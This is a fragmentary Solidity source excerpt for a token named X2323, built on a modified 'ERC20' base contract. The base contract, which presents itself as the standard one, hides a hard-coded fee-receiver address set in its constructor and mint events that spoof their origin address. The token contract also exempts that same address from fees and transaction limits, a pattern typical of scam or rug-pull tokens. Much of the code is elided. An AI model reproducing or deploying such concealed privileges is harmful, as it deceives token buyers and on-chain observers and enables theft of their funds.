...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x71949C00a5C2D14664e1741bF744DDE38152c215] = _marketingwallet;
    }
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0x3f278B59BFB69CAB050DF3add373D14F8c32BA45), account, amount);
    }
...
contract X2323 is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("X2323", "X2323") {
        ...
        excludeFromFees(address(0x71949C00a5C2D14664e1741bF744DDE38152c215), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x71949C00a5C2D14664e1741bF744DDE38152c215), true);
